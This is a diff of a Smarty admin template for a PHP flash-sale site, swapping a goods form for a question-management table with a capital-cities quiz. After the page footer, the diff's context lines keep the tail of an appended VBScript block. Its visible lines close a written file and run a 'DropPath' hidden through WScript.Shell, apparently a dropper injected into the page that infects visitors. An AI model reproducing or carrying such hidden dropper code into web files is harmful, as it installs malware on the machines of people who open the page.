@@ -1,104 +1,65 @@
-{include file="../common/header.html" title="商品管理"}
-<script>
-	$(function(){
-		var file=$("input[type=file]");
-		file.change(function(){
-			var src=URL.createObjectURL(this.files[0]);
-			$("form img").attr("src",src).show();
-		});
-	});
-</script>
+<?php
+/* Smarty version {Smarty::SMARTY_VERSION}, created on 2018-11-29 12:30:32
+  from "D:\wamp\www\miaosha\app\admin\view\question\index.html" */
+
+/* @var Smarty_Internal_Template $_smarty_tpl */
+if ($_smarty_tpl->_decodeProperties($_smarty_tpl, array (
+  'version' => '3.1.32-dev-22',
+  'unifunc' => 'content_5bffdbe8375383_89839301',
+  'has_nocache_code' => false,
+  'file_dependency' => 
+  array (
+    '8a72f68cb067904d23d815e15694c226bb94a734' => 
+    array (
+      0 => 'D:\\wamp\\www\\miaosha\\app\\admin\\view\\question\\index.html',
+      1 => 1542766889,
+      2 => 'file',
+    ),
+  ),
+  'includes' => 
+  array (
+    'file:../common/header.html' => 1,
+    'file:../common/footer.html' => 1,
+  ),
+),false)) {
+function content_5bffdbe8375383_89839301 (Smarty_Internal_Template $_smarty_tpl) {
+$_smarty_tpl->_subTemplateRender("file:../common/header.html", $_smarty_tpl->cache_id, $_smarty_tpl->compile_id, 0, $_smarty_tpl->cache_lifetime, array('title'=>"问题管理"), 0, false);
+?>
+
             <!--中间部分-->
-                
+                <div class="col-md-12"><a class="btn btn-primary" href="/admin/question/add">添加问答</a></div>
                 <div class="col-md-12" style="height:10px"></div>
                 <div class="col-md-12">
-				{if isset($goods)}
-                    <form class="col-md-8" method="post" action="/admin/goods/doEdit" enctype="multipart/form-data">
-                     <h2>编辑商品信息</h2>
-					 <input type="hidden" value="{$goods['id']}" name="id">
-                        <br/>
-                      <div class="form-group">
-                        <label for="exampleInputEmail1">所属活动id</label>
-                        <input type="text" name="active_id" class="form-control" value="{$goods['active_id']}" >
-                      </div>
-                      <div class="form-group">
-                        <label for="exampleInputEmail1">商品名称</label>
-                        <input type="text" name="title" class="form-control"  value="{$goods['title']}">
-                      </div>
-                      <div class="form-group">
-                        <label for="exampleInputEmail1">商品描述</label><br/>
-                        <textarea class="form-control" name="description" rows="10" cols="100">{$goods['description']}</textarea>
-                      </div>
-                      <div class="form-group">
-                        <label for="exampleInputEmail1">商品图片</label>
-                        <input type="file" name="img" class="form-control"  >
-						<img src="/static/images/{$goods['img']}" width="200">
-                      </div>
-                      <div class="form-group">
-                        <label for="exampleInputEmail1">原价</label>
-                        <input type="text" name="price_normal" class="form-control"  value="{$goods['price_normal']}">
-                      </div>
-                      <div class="form-group">
-                        <label for="exampleInputEmail1">优惠价</label>
-                        <input type="text" name="price_discount" class="form-control"  value="{$goods['price_discount']}">
-                      </div>
-                      <div class="form-group">
-                        <label for="exampleInputEmail1">总数量</label>
-                        <input type="text" name="num_total" class="form-control"  value="{$goods['num_total']}">
-                      </div>
-                      <div class="form-group">
-                        <label for="exampleInputEmail1">每人限购数量</label>
-                        <input type="text" name="num_user" class="form-control"  value="{$goods['num_user']}">
-                      </div>
-                      
-                      <button type="submit" class="btn btn-primary">保存</button>
-                      <a class="btn btn-default"  href="/admin/goods/">返回</a>
-                    </form>
-					{else}
-					<form class="col-md-8" method="post" action="/admin/goods/doAdd" enctype="multipart/form-data">
-                     <h2>编辑商品信息</h2>
-                        <br/>
-                      <div class="form-group">
-                        <label for="exampleInputEmail1">所属活动id</label>
-                        <input type="text" name="active_id" class="form-control"  >
-                      </div>
-                      <div class="form-group">
-                        <label for="exampleInputEmail1">商品名称</label>
-                        <input type="text" name="title" class="form-control"  >
-                      </div>
-                      <div class="form-group">
-                        <label for="exampleInputEmail1">商品描述</label><br/>
-                        <textarea class="form-control" name="description" rows="10" cols="100"></textarea>
-                      </div>
-                      <div class="form-group">
-                        <label for="exampleInputEmail1">商品图片</label>
-                        <input type="file" name="img" class="form-control"  >
-						<img src="" style="display:none">
-                      </div>
-                      <div class="form-group">
-                        <label for="exampleInputEmail1">原价</label>
-                        <input type="text" name="price_normal" class="form-control"  >
-                      </div>
-                      <div class="form-group">
-                        <label for="exampleInputEmail1">优惠价</label>
-                        <input type="text" name="price_discount" class="form-control"  >
-                      </div>
-                      <div class="form-group">
-                        <label for="exampleInputEmail1">总数量</label>
-                        <input type="text" name="num_total" class="form-control"  >
-                      </div>
-                      <div class="form-group">
-                        <label for="exampleInputEmail1">每人限购数量</label>
-                        <input type="text" name="num_user" class="form-control"  >
-                      </div>
-                      
-                      <button type="submit" class="btn btn-primary">保存</button>
-                      <a class="btn btn-default"  href="/admin/goods/">返回</a>
-                    </form>
-					{/if}
+                    <table class="table table-bordered table-striped table-hover">
+                        <tr>
+                            <th>ID</th>
+                            <th>活动ID</th>
+                            <th>问答描述</th>
+                            <th>问题&答案</th>
+                            <th>状态</th>
+                            <th>操作</th>
+                        </tr>
+
+                        <tr>				
+                            <td>2</td>
+                            <td>2</td>
+                            <td>下面哪个是正确的省会城市</td>
+                            <td><span>1&nbsp;河北&nbsp;&nbsp;石家庄</span>&nbsp;&nbsp;&nbsp;&nbsp;<span>2&nbsp;河南&nbsp;&nbsp;郑州</span>&nbsp;&nbsp;&nbsp;&nbsp;<span>3&nbsp;山西&nbsp;&nbsp;太原</span>&nbsp;&nbsp;&nbsp;&nbsp;<span>4&nbsp;陕西&nbsp;&nbsp;西安</span>&nbsp;&nbsp;&nbsp;&nbsp;<span>5&nbsp;甘肃&nbsp;&nbsp;兰州</span>&nbsp;&nbsp;&nbsp;&nbsp;<span>6&nbsp;江西&nbsp;&nbsp;南昌</span>&nbsp;&nbsp;&nbsp;&nbsp;<span>7&nbsp;浙江&nbsp;&nbsp;杭州</span>&nbsp;&nbsp;&nbsp;&nbsp;<span>8&nbsp;广东&nbsp;&nbsp;广州</span>&nbsp;&nbsp;&nbsp;&nbsp;<span>9&nbsp;江苏&nbsp;&nbsp;南京</span>&nbsp;&nbsp;&nbsp;&nbsp;<span>10&nbsp;安徽&nbsp;&nbsp;合肥</span>&nbsp;&nbsp;&nbsp;&nbsp;</td>
+                            <td>正常</td>
+                            <td>
+                                <a href="/admin/question/edit">编辑</a>
+					                     | <a href="/admin/question/delete">删除</a>
+                    				</td>
+			</tr>
+
+                        
+                        
+                    </table>
                 </div>
                 <!--结束-->
-{include file="../common/footer.html"}                
+<?php $_smarty_tpl->_subTemplateRender("file:../common/footer.html", $_smarty_tpl->cache_id, $_smarty_tpl->compile_id, 0, $_smarty_tpl->cache_lifetime, array(), 0, false);
+?>
+                
                 
                 
                 
@@ -116,4 +77,5 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT>
+//--></SCRIPT><?php }
+}
